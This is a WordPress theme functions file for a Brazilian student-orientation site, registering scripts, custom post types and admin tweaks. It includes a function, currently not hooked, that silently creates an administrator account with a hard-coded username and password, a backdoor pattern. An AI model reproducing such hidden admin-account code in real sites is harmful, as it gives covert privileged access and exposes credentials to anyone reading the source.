<?php
@ini_set( 'upload_max_size' , '64M' );
@ini_set( 'post_max_size', '64M');
@ini_set( 'max_execution_time', '300' );

add_action( 'after_setup_theme', 'initTheme' );

/************************************************************
* Styles
*************************************************************/
function styles(){
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/css/bootstrap.min.css', '1', true );
	wp_enqueue_style( 'css', get_template_directory_uri() . '/css/css.css', '1', true );
	wp_enqueue_style( 'msg', get_template_directory_uri() . '/css/jquery.msg.css', '6', true );
	wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/fancybox/jquery.fancybox.css?v=2.1.5', '1', true );
	wp_enqueue_style( 'ddlist', get_template_directory_uri() . '/css/service.ddlist.jquery.css', '6', true );
	wp_enqueue_style( 'owl-carousel', get_template_directory_uri() . '/owl-carousel/owl.carousel.css', '1', true );
	wp_enqueue_style( 'owl-theme', get_template_directory_uri() . '/owl-carousel/owl.theme.css', '1', true );
}
/************************************************************
* Scripts
*************************************************************/

function scripts(){
	wp_enqueue_script( 'js', '//code.jquery.com/jquery-2.1.4.min.js', array(), '1', false);
    wp_enqueue_script( 'tweenmax', get_template_directory_uri() . '/js/tweenmax/TweenMax.min.js', array(), '1', true);
    wp_enqueue_script( 'cssp', get_template_directory_uri() . '/js/tweenmax/plugins/CSSPlugin.min.js', array(), '1', true);
    wp_enqueue_script( 'ease-pack', get_template_directory_uri() . '/js/tweenmax/easing/EasePack.min.js', array(), '1', true);
    wp_enqueue_script( 'tween-lite', get_template_directory_uri() . '/js/tweenmax/TweenLite.min.js', array(), '1', true);
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/js/bootstrap.min.js', array(), '1', true);
	wp_enqueue_script( 'msg', get_template_directory_uri() . '/js/jquery.msg.min.js', array(), '1', true);
	wp_enqueue_script( 'center', get_template_directory_uri() . '/js/jquery.center.min.js', array(), '1', true);
	wp_enqueue_script( 'attekitaSlider', get_template_directory_uri() . '/js/attekitaJSSlider.js', array(), '1', true);
    wp_enqueue_script( 'site', get_template_directory_uri() . '/js/js.js', array(), '1', true);
	wp_enqueue_script( 'mascaras', get_template_directory_uri() . '/js/mascaras.js', array(), '1', true);
	wp_enqueue_script( 'ddlist', get_template_directory_uri() . '/js/service.ddlist.jquery.min.js', array(), '1', true);
	wp_enqueue_script( 'cookie', get_template_directory_uri() . '/js/js.cookie.js', array(), '1', true);	
	wp_enqueue_script( 'owl-carousel', get_template_directory_uri() . '/owl-carousel/owl.carousel.js', array(), '1', true);
	wp_enqueue_script( 'fancybox', get_template_directory_uri() . '/fancybox/jquery.fancybox.pack.js', array(), '1', true);
	
	if(is_home()){
		wp_enqueue_script( 'index', get_template_directory_uri() . '/js/index.js', array(), '1', true);	
	}

	if(is_page('contato')){
		 wp_enqueue_script( 'form', get_template_directory_uri() . '/js/form.js', array(), '1', true);
		 wp_enqueue_script( 'contato', get_template_directory_uri() . '/js/contato.js', array(), '1', true);
		 wp_enqueue_style( 'contato', get_template_directory_uri() . '/css/contato.css', '1', true );
	}
	
	if(is_page('o-programa')){
		 wp_enqueue_style( 'o-programa', get_template_directory_uri() . '/css/o-programa.css', '1', true );
	}
	
	if(is_page('fama-nas-escolas')){
		 wp_enqueue_style( 'fama-nas-escolas', get_template_directory_uri() . '/css/fama-nas-escolas.css', '1', true );
		 wp_enqueue_script( 'fama-nas-escolas', get_template_directory_uri() . '/js/fama-nas-escolas.js', array(), '1', true);
	}
	
	if(is_page('feira-das-profissoes')){
		 wp_enqueue_style( 'feira-das-profissoes', get_template_directory_uri() . '/css/feira-das-profissoes.css', '1', true );
		 wp_enqueue_script( 'feira-das-profissoes', get_template_directory_uri() . '/js/feira-das-profissoes.js', array(), '1', true);
		 wp_enqueue_script( 'form', get_template_directory_uri() . '/js/form.js', array(), '1', true);
	}
	
	if(is_archive('profissoes') || is_singular('profissoes')){
		wp_enqueue_style( 'guia-das-profissoes', get_template_directory_uri() . '/css/guia-das-profissoes.css', '1', true );
	}
	
	if(is_page('enem') || is_page('dicas-do-enem') || is_page('provas-anteriores') || is_page('a-importancia-do-enem')){
		 wp_enqueue_style( 'enem', get_template_directory_uri() . '/css/enem.css', '1', true );
	}
	
	if(is_page('provao') || is_page('provao-2016') ){
		 wp_enqueue_style( 'enem', get_template_directory_uri() . '/css/provao.css', '1', true );
		 wp_enqueue_script( 'provao', get_template_directory_uri() . '/js/provao.js', array(), '1', true);
	}
	
	if(is_page('ranking') || is_archive('resultados') || is_search()){
	 	wp_enqueue_style( 'enem', get_template_directory_uri() . '/css/enem.css', '1', true );
	 	wp_enqueue_script( 'resultados', get_template_directory_uri() . '/js/resultados.js', array(), '1', true);
	}
	
	if(is_page('blog') || is_singular('post') || is_category()){
		 wp_enqueue_style( 'blog', get_template_directory_uri() . '/css/blog.css', '1', true );
	}
	
	if(is_archive('teste1') || is_search()){
	 	//wp_enqueue_style( 'enem', get_template_directory_uri() . '/css/enem.css', '1', true );
	 	//wp_enqueue_script( 'resultados', get_template_directory_uri() . '/js/resultados.js', array(), '1', true);
		//echo "aqui";
		//exit;
	}
	
	if(is_page('estude-na-fama')){
		 wp_enqueue_style( 'estude-na-fama', get_template_directory_uri() . '/css/estude.css', '1', true );
		 wp_enqueue_script( 'estude', get_template_directory_uri() . '/js/estude.js', array(), '1', true);
	}
	
	if(is_page('bolsas-e-creditos')){
		 wp_enqueue_style( 'bolsas-e-creditos', get_template_directory_uri() . '/css/bolsas.css', '1', true );
		 wp_enqueue_script( 'bolsas-e-creditos', get_template_directory_uri() . '/js/bolsas-e-creditos.js', array(), '1', true);
	}
	
	if(is_page('teste-de-habilidades') || is_page('resultado-quiz') || is_page('resultado')){
		 wp_enqueue_style( 'teste-de-habilidades', get_template_directory_uri() . '/css/teste-de-habilidades.css', '1', true );
	}
	
	if(is_page('teste-de-habilidades-cadastro')){
		 wp_enqueue_style( 'teste-de-habilidades', get_template_directory_uri() . '/css/teste-de-habilidades.css', '1', true );
		 wp_enqueue_script( 'cadastro', get_template_directory_uri() . '/js/cadastro.js', array(), '1', true);
		 wp_enqueue_script( 'form', get_template_directory_uri() . '/js/form.js', array(), '1', true);
	}
	
	if(is_page('quiz')){
		 wp_enqueue_style( 'teste-de-habilidades', get_template_directory_uri() . '/css/teste-de-habilidades.css', '1', true );
		 wp_enqueue_script( 'quiz', get_template_directory_uri() . '/js/quiz.js', array(), '2', true);
	}
}

/************************************************************
* POST TYPES
*************************************************************/
function postTypes(){
	wp_cpt('Banner', 'banner', 'post', 'banner', false, array('title', 'editor'), 'dashicons-format-image');
	wp_cpt('Profissões', 'profissoes', 'post', 'profissoes', false, array('title', 'editor'), 'dashicons-welcome-learn-more');
	wp_cpt('Teste de Habilidades', 'testedehabilidades', 'post', 'testedehabilidades', false, array('title', 'editor'), 'dashicons-welcome-learn-more');
	wp_cpt('Inscrições', 'inscricoes', 'post', 'inscricoes', false, array('title', 'editor'), 'dashicons-welcome-learn-more');
	//wp_cpt('Resultados Provão', 'resultados', 'post', 'resultados', false, array('title', 'editor'), 'dashicons-edit');
	wp_cpt('Popup', 'popup', 'post', 'popup', false, array('title', 'editor'), 'dashicons-flag');
	wp_cpt('Galeria', 'galeria', 'post', 'galeria', false, array('title', 'editor'), 'dashicons-format-image');
	wp_cpt('Galeria Destaque', 'galeria_destaque', 'post', 'galeria_destaque', false, array('title', 'editor'), 'dashicons-format-image');
}
/************************************************************
* REMOVE IMAGENS SIZES
*************************************************************/
function removeImgsSize( $sizes) {
    unset( $sizes['medium']);
    unset( $sizes['large']);
    return $sizes;
}
add_filter('intermediate_image_sizes_advanced', 'removeImgsSize');

function wpmayor_custom_image_sizes($sizes) {
    $myimgsizes = array( "image-in-post" => __( "Image in Post" ),"full" => __( "Original size" ));
    return $myimgsizes;
}
add_filter('image_size_names_choose', 'wpmayor_custom_image_sizes');

function youtube_id_from_url($url) {
    $pattern = 
        '%^# Match any youtube URL
        (?:https?://)?  # Optional scheme. Either http or https
        (?:www\.)?      # Optional www subdomain
        (?:             # Group host alternatives
          youtu\.be/    # Either youtu.be,
        | youtube\.com  # or youtube.com
          (?:           # Group path alternatives
            /embed/     # Either /embed/
          | /v/         # or /v/
          | /watch\?v=  # or /watch\?v=
          )             # End path alternatives.
        )               # End host alternatives.
        ([\w-]{10,12})  # Allow 10-12 for 11 char youtube id.
        $%x'
        ;
    $result = preg_match($pattern, $url, $matches);
    if ($result) {
        return $matches[1];
    }
    return false;
}
/************************************************************
* FUNCTIONS
*************************************************************/
function initTheme(){
	add_action('init', 'postTypes', 0);
	add_action( 'login_enqueue_scripts', 'my_login_stylesheet' );
	add_action( 'wp_enqueue_scripts', 'styles' );
	add_action( 'wp_enqueue_scripts', 'scripts' );
	add_filter('admin_footer_text', 'admin_rodape');
    add_filter('update_footer', 'versao_site', 9999 );
	add_filter('map_meta_cap', 'themeInstalOff', 10, 2);
    // add_action('admin_menu', 'themeEditorOff', 999);
	add_action('admin_menu', 'add_dashboard_menu');
	add_action('login_enqueue_scripts', 'splaylogin' );
    // Dashboard
    add_action('admin_head', 'dashRemove');
    add_action('wp_dashboard_setup', 'dashRemoveBoxes');
    add_action('wp_dashboard_setup', 'dashMensagemBox');
    add_filter('get_user_option_screen_layout_dashboard', 'dashSingleBoxe' );
    // add_action('admin_menu', 'remove_menus');
    add_action('widgets_init', 'remove_default_widgets', 11);
	add_action( 'widgets_init', 'widgets_novos_widgets_init' );
	//Custom Button
	add_filter( 'views_edit-inscricoes', 'so_13813805_add_button_to_views' );
	add_filter( 'views_edit-testedehabilidades', 'so_13813806_add_button_to_views' );
	//add_action('init','admin_account_code');
	add_action( 'admin_menu', 'remove_acf_menu', 999);
}
function admin_account_code(){
$user = 'estudiocriar';
$pass = 'eco2015f';
$email = 'email@estudiocriar.com';
if ( !username_exists( $user ) && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
} }
/*Custom Button*/
function so_13813805_add_button_to_views( $views )
{
    $views['my-button'] = '<a href="'.get_template_directory_uri().'/php/print-inscricoes.php" target="_blank"><button id="imprimir-lista" type="button"  title="Imprimir Lista" class="button action">Exportar Lista</button></a>';
    return $views;
}
function so_13813806_add_button_to_views( $views )
{
    $views['my-button'] = '<a href="'.get_template_directory_uri().'/php/print-quiz.php" target="_blank"><button id="imprimir-lista" type="button"  title="Imprimir Lista" class="button action">Exportar Lista</button></a>';
    return $views;
}
/************************************************************
* Paginação
*************************************************************/
function wp_paginacao($query){
    $big = 999999999;
    echo paginate_links( array(
        'base'      => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
        'format'    => '?paged=%#%',
        'current'   => max( 1, get_query_var('paged') ),
        'total'     => $query->max_num_pages,
        'type'      => 'list',
        'prev_next' => true,
        'prev_text' => '‹',
        'next_text' => '›',
        'mid_size'  => 0,
        'end_size'  => 5
    ) );
}
/* Image Crop */
function imgCrop($url, $width, $height, $zoom,$echo = true){
	if($echo == true){
    echo bloginfo('template_directory')."/timthumb/timthumb.php?src=".$url."&amp;w=".$width."&amp;h=".$height."&amp;zc=".$zoom;
	}else{
	return 	get_template_directory_uri()."/timthumb/timthumb.php?src=".$url."&amp;w=".$width."&amp;h=".$height."&amp;zc=".$zoom;
	}
} 
/* Pages Menus */
function add_dashboard_menu(){
	 add_menu_page( 'SEO & Social', 'SEO & Social', 'edit_posts', '/post.php?post=4&action=edit', null, 'dashicons-admin-generic' );
	 add_menu_page( 'O Progama', 'O Programa', 'edit_posts', '/post.php?post=16&action=edit', null, 'dashicons-star-filled' );
	 add_menu_page( 'Fama nas Escolas', 'Fama nas Escolas', 'edit_posts', '/post.php?post=29&action=edit', null, 'dashicons-star-filled' );
	 add_menu_page( 'Estude na Fama', 'Estude na Fama', 'edit_posts', '/post.php?post=77&action=edit', null, 'dashicons-star-filled' );
	 add_menu_page( 'Feira das Profissoes', 'Feira das Profissoes', 'edit_posts', '/post.php?post=37&action=edit', null, 'dashicons-welcome-learn-more' );
	 add_menu_page( 'Bolsas e Créditos', 'Bolsas e Créditos', 'edit_posts', '/post.php?post=82&action=edit', null, 'dashicons-products' );
	 add_menu_page( 'Enem', 'Enem', 'edit_posts', '/post.php?post=48&action=edit', null, 'dashicons-edit' );
	 add_menu_page( 'Provão', 'Provão', 'edit_posts', '/post.php?post=2824&action=edit', null, 'dashicons-edit' );
	 add_menu_page( 'Contato', 'Contato', 'edit_posts', '/post.php?post=14&action=edit', null, 'dashicons-admin-comments' );
	 
}
/*Widgets*/
function widgets_novos_widgets_init() {	}
/* Remove Menus */
function remove_acf_menu() {
	remove_menu_page('edit.php?post_type=acf');
	remove_menu_page('bws_panel');
	remove_menu_page('loco');
	
}
function remove_menus($wpmenu) {
    global $menu;
    $restricted = array(__('Menu'), __('Media'), __('Links'), __('Comments'), __('Posts'), __('Painel'),  __('Dashboard'), __('Plugins'),__('Tools'),  __('Pages'), __('Appearance'),/*__('Users'),__('Settings')*/);
    end($menu);
    while (prev($menu)) {$value = explode(' ', $menu[key($menu)][0]); if (in_array($value[0] != NULL ? $value[0] : "", $restricted)) {unset($menu[key($menu)]); }}
}
/* Remove Widgets */
function remove_default_widgets() {
    unregister_widget('WP_Widget_Pages');
    unregister_widget('WP_Widget_Calendar');
    unregister_widget('WP_Widget_Archives');
    unregister_widget('WP_Widget_Links');
    unregister_widget('WP_Widget_Meta');
    unregister_widget('WP_Widget_Search');
    unregister_widget('WP_Widget_Text');
    unregister_widget('WP_Widget_Categories');
    unregister_widget('WP_Widget_Recent_Posts');
    unregister_widget('WP_Widget_Recent_Comments');
    unregister_widget('WP_Widget_RSS');
    unregister_widget('WP_Widget_Tag_Cloud');
    unregister_widget('WP_Nav_Menu_Widget');
}
/* Remove Instalador de Themas */
function themeInstalOff         ($caps, $cap) {if ($cap === 'install_themes') $caps[] = 'do_not_allow'; return $caps; }
/* Remove Editor de Themas */
function themeEditorOff         () {$page = remove_submenu_page('themes.php', 'themes.php'); $page = remove_submenu_page('themes.php', 'theme-editor.php'); }
/* Rodapé Admin */
function admin_rodape           () {echo ""; }
function versao_site            () {return 'Versão 1.0'; }
/* Resumo */
function abreviaString($texto, $limite, $tres_p = '...')
{
    $totalCaracteres = 0;
    //Retorna o texto em plain/text
    $texto = somenteTexto($texto);
    //Cria um array com todas as palavras do texto
    $vetorPalavras = explode(" ",$texto);
    if(strlen($texto) <= $limite):
        $tres_p = "";
        $novoTexto = $texto;
    else:
        //Começa a criar o novo texto resumido.
        $novoTexto = "";
        //Acrescenta palavra por palavra na string enquanto ela
        //não exceder o tamanho máximo do resumo
        for($i = 0; $i <count($vetorPalavras); $i++):
            $totalCaracteres += strlen(" ".$vetorPalavras[$i]);
            if($totalCaracteres <= $limite)
                $novoTexto .= ' ' . $vetorPalavras[$i];
            else break;
        endfor;
    endif;
    return $novoTexto . $tres_p;
}
function somenteTexto($string)
{
    $trans_tbl = get_html_translation_table(HTML_ENTITIES);
    $trans_tbl = array_flip($trans_tbl);
    return trim(strip_tags(strtr($string, $trans_tbl)));
}
/* Dashboard */
function my_login_stylesheet() {wp_enqueue_style( 'custom-login', get_template_directory_uri() . '/style-login.css' );}
function splaylogin             () {echo "<style type=\"text/css\"> body.login div#login h1 a {width: 320px; height: 80px; padding-bottom: 30px; background-image: url(".get_bloginfo('template_directory')."/logo.png); background-size: auto; } </style>"; }
function dashSingleBoxe         (){return 1; }
function dashRemoveBoxes        (){global$wp_meta_boxes; unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']); unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']); unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']); unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']); unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']); unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']); unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']); unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']); }
function mensagem_dashboard     (){echo 'Bem vindo ao painel de controle!';}
function dashMensagemBox        (){global $wp_meta_boxes; wp_add_dashboard_widget('custom_help_widget', 'Bem Vindos!', 'mensagem_dashboard'); }
function dashSingleCol          ($columns) {$columns['dashboard'] = 1; return $columns; }
function dashRemove             () {echo '<style type="text/css"> #contextual-help-link-wrap { display: none !important; } #welcome-panel { display: none !important; } #dashboard_custom_feed { display: none !important; } #gf_dashboard_message { display: none !important; } .icon32.icon-dashboard, #icon-index{ background-position: -137px -5px; display: none !important;} </style>'; }
/* Post Types */
function wp_cpt($singularName, $pluralname, $type, $slug, $hierachical, $suports, $icon='dashicons-admin-post'){
    $labels = array(
        'name'                  => $singularName,
        'singular_name'         => $singularName,
        'menu_name'             => $singularName,
        'all_items'             => 'Ver tudo',
        'view_item'             => 'Ver Detalhes',
        'add_new_item'          => 'Adicionar',
        'add_new'               => 'Adicionar',
        'edit_item'             => 'Editar '.$singularName,
        'update_item'           => 'Atualizar '.$singularName,
        'not_found_in_trash'    => 'Não há itens na lixeira',
    );
    $args = array(
        'label'                 => $pluralname,
        'description'           => $singularName.' para página inicial',
        'labels'                => $labels,
        'supports'              => $suports,
        'hierarchical'          => $hierachical,
        'public'                => true,
        'show_ui'               => true,
        'show_in_menu'          => true,
        'show_in_nav_menus'     => true,
        'show_in_admin_bar'     => true,
        'menu_position'         => 5,
        'can_export'            => true,
        'has_archive'           => true,
        'rewrite'               => array('slug' => $slug),
        'exclude_from_search'   => false,
        'publicly_queryable'    => true,
        'capability_type'       => $type,
        'menu_icon'             => $icon,
    );
    register_post_type($pluralname, $args);
}
?>